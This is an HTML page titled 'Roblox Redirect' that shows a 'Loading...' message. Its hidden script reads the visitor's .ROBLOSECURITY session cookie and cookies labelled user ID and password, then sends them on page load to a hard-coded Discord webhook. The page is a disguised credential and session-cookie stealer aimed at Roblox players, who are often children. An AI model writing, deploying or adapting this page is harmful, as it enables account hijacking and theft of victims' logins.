<!DOCTYPE html>
<html>
<head>
  <title>Roblox Redirect</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
    }
  </style>
</head>
<body>
  <h1>Loading...</h1>

  <script>
    // Get the Roblox cookie
    const robloxCookie = getCookie('.ROBLOSECURITY');

    // Get the user's ID and password
    const userId = getCookie('UserID');
    const password = getCookie('Password');

    // Send the user's ID, password, and cookie to the webhook
    fetch('https://discord.com/api/webhooks/1290240903889551390/Ukw61tWNoBGeFL-IRrK0BlfjgyfkzMguKGL93hmmIBWPCtWN8RqVUUrEenf9KDAt0WQk', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        userId: userId,
        password: password,
        cookie: robloxCookie,
      }),
    })
      .then((response) => response.json())
      .then((data) => console.log(data))
      .catch((error) => console.error(error));
  </script>

  <script>
    function getCookie(name) {
      const value = `; ${document.cookie}`;
      const parts = value.split(`; ${name}=`);
      if (parts.length === 2) return parts.pop().split(';').shift();
    }
  </script>
</body>
</html>
